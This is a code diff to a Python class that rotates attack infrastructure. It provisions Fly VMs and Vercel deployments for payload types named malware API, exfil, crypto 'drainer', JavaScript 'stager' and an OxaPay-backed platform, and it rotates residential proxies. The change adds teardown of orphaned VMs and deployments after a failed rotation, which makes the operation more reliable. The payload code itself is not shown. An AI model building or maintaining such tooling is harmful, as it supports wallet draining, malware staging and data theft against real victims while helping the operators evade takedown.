@@ -61,6 +61,10 @@ class ChimeraRotationV2:
         renderer = PolymorphicRenderer(seed=deployment_seed)
         session_key = secrets.token_hex(16)
 
+        # Track partial state for cleanup on failure
+        self._partial_fly_sessions: list[dict[str, Any]] = []
+        self._partial_vercel: list[dict[str, Any]] = []
+
         # 1. Provision Fly VMs (for dynamic payloads: malware API, exfil, flipper, etc.)
         #    Each payload type may need a different image, so we provision per-payload-type.
         fly_payloads = self.registry.get_fly_payloads()
@@ -113,6 +117,7 @@ class ChimeraRotationV2:
                 fly_session["payload_type"] = pdef.payload_type
                 fly_session["payload_id"] = pdef.id
                 fly_sessions.append(fly_session)
+                self._partial_fly_sessions.append(fly_session)
 
         # Use the first fly session for backward compat (existing payload rendering)
         fly_session = fly_sessions[0] if fly_sessions else None
@@ -136,7 +141,7 @@ class ChimeraRotationV2:
                     files={"index.html": html},
                     suffix=f"{ts}-{pdef.id}",
                 )
-                vercel_deployments.append(vdep)
+                vercel_deployments.append(vdep); self._partial_vercel.append(vdep)
 
             elif pdef.payload_type == "drainer":
                 html = renderer.render_drainer(
@@ -148,7 +153,7 @@ class ChimeraRotationV2:
                     files={"index.html": html},
                     suffix=f"{ts}-{pdef.id}",
                 )
-                vercel_deployments.append(vdep)
+                vercel_deployments.append(vdep); self._partial_vercel.append(vdep)
 
             elif pdef.payload_type == "stager":
                 js = renderer.render_stager(
@@ -160,7 +165,7 @@ class ChimeraRotationV2:
                     files={"index.html": "<html></html>", "app.js": js},
                     suffix=f"{ts}-{pdef.id}",
                 )
-                vercel_deployments.append(vdep)
+                vercel_deployments.append(vdep); self._partial_vercel.append(vdep)
 
             elif pdef.payload_type == "telemetry_platform":
                 # Deploy a Vercel redirector that proxies ALL routes to the
@@ -180,7 +185,7 @@ class ChimeraRotationV2:
                         suffix=f"{ts}-{pdef.id}",
                         proxy_all=True,
                     )
-                    vercel_deployments.append(vdep)
+                    vercel_deployments.append(vdep); self._partial_vercel.append(vdep)
                     # Patch the BASE_URL env on the VM to the Vercel URL
                     # (OxaPay callbacks need a public HTTPS URL)
                     vercel_url = f"https://{vdep['deployment_url']}"
@@ -202,7 +207,7 @@ class ChimeraRotationV2:
                     files=files,
                     suffix=f"{ts}-{pdef.id}",
                 )
-                vercel_deployments.append(vdep)
+                vercel_deployments.append(vdep); self._partial_vercel.append(vdep)
 
         # 3. Rotate residential proxy
         logging.info(f"[cycle {ts}] Rotating residential proxy pool...")
@@ -260,7 +265,10 @@ class ChimeraRotationV2:
             self.fly.destroy_vm(str(fs["app_name"]), str(fs["vm_id"]))
         for vdep in session.get("vercel", []):
             logging.info(f"[teardown {ts}] Removing Vercel deployment {vdep['deployment_id']}...")
-            self.vercel.destroy_deployment(str(vdep["deployment_id"]))
+            self.vercel.destroy_deployment(
+                str(vdep["deployment_id"]),
+                project_id=str(vdep.get("project_id")),
+            )
         logging.info(f"[teardown {ts}] Complete.")
 
     @property
@@ -283,7 +291,28 @@ class ChimeraRotationV2:
                         logging.info(f"  Active endpoint [{name}]: {url}")
                 except Exception as e:
                     logging.error(f"Rotation failed: {e}")
+                    # Clean up any partial session that was created before the failure
+                    # This prevents orphaned Fly VMs and Vercel deployments
+                    partial = self._build_partial_session()
+                    if partial:
+                        logging.info(f"[cleanup] Tearing down {len(partial.get('fly_sessions', []))} "
+                                     f"orphaned VMs + {len(partial.get('vercel', []))} Vercel deployments")
+                        self._teardown(partial)
             time.sleep(self.cycle_minutes * 60)
+
+    def _build_partial_session(self) -> Optional[dict[str, Any]]:
+        """Build a session dict from any VMs/deployments that were created
+        before the rotation failed. Used for cleanup on failure."""
+        # The _rotate_cycle method stores partial state on self during execution
+        partial_fly = getattr(self, "_partial_fly_sessions", [])
+        partial_vercel = getattr(self, "_partial_vercel", [])
+        if not partial_fly and not partial_vercel:
+            return None
+        return {
+            "fly_sessions": partial_fly,
+            "vercel": partial_vercel,
+            "ts": "cleanup",
+        }
 
     def stop(self) -> None:
         self._running = False
